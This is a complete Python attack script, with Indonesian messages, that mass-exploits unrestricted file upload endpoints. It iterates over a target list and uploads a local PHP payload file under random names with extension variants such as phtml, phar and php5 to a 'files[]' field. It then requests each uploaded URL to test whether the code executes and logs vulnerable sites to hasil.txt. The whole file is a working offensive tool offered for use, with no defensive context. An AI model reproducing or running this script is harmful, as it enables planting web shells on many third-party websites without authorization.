# by Indonesiancodeparty | 2015-2025

import requests
import os
import sys
import shutil
import random
import string
from urllib.parse import urljoin
from colorama import Fore, Style, init

init(autoreset=True)

TARGETS_FILE = "list.txt"
BASE_PAYLOAD = "ex.php"
FIELD_NAME = "files"
OUTPUT_FILE = "hasil.txt"
EXTENSIONS = ["php5", "php7", "php56", "phar", "phtml", "php2", "phps", "php"]

def gen_random_filename(ext):
    name = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    return f"{name}.{ext}"

# Cek file
if not os.path.isfile(BASE_PAYLOAD):
    print(f"{Fore.RED}[!] File {BASE_PAYLOAD} tidak ditemukan.")
    sys.exit(1)

# Load target list
try:
    with open(TARGETS_FILE, "r") as f:
        targets = [line.strip() for line in f if line.strip()]
except Exception as e:
    print(f"{Fore.RED}[!] Gagal baca list.txt: {e}")
    sys.exit(1)

# Kosongkan hasil.txt
open(OUTPUT_FILE, "w").close()

for target in targets:
    print(f"{Fore.CYAN}\n[+] Target: {target}")

    for ext in EXTENSIONS:
        rand_name = gen_random_filename(ext)
        shutil.copy(BASE_PAYLOAD, rand_name)

        try:
            with open(rand_name, 'rb') as f:
                files = {FIELD_NAME + "[]": (rand_name, f, 'application/octet-stream')}
                resp = requests.post(target, files=files, timeout=15)

            if resp.status_code == 200 and "files" in resp.text:
                try:
                    json_data = resp.json()
                    file_entry = json_data["files"][0]
                    if "url" in file_entry and "/files/" in file_entry["url"]:
                        file_url = file_entry["url"]
                        print(f"{Fore.GREEN}[✓] Upload sukses: {file_url}")

                        try:
                            r = requests.get(file_url, timeout=10)
                            content_type = r.headers.get("Content-Type", "")
                            if "text/html" in content_type or "VULN" in r.text or r.text.strip().startswith("<"):
                                print(f"{Fore.RED}[VULN] Tereksekusi di web!")
                                with open(OUTPUT_FILE, "a") as out:
                                    out.write(f"[VULN] {file_url}\n")
                            else:
                                print(f"{Fore.YELLOW}[!] Hanya terdownload ({rand_name})")
                                with open(OUTPUT_FILE, "a") as out:
                                    out.write(f"[DOWNLOADABLE] {file_url}\n")
                        except Exception as e:
                            print(f"{Fore.RED}[!] Gagal akses file terupload: {e}")
                    else:
                        print(f"{Fore.YELLOW}[!] Upload sukses tapi URL tidak valid.")
                except Exception as e:
                    print(f"{Fore.YELLOW}[!] JSON parse error: {e}")
            else:
                print(f"{Fore.RED}[✗] Gagal upload {rand_name}. Status: {resp.status_code}")

        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[!] Error koneksi: {e}")
        except KeyboardInterrupt:
            print(f"{Fore.YELLOW}\n[!] Dihentikan oleh user.")
            sys.exit(0)
        finally:
            if os.path.exists(rand_name):
                os.remove(rand_name)
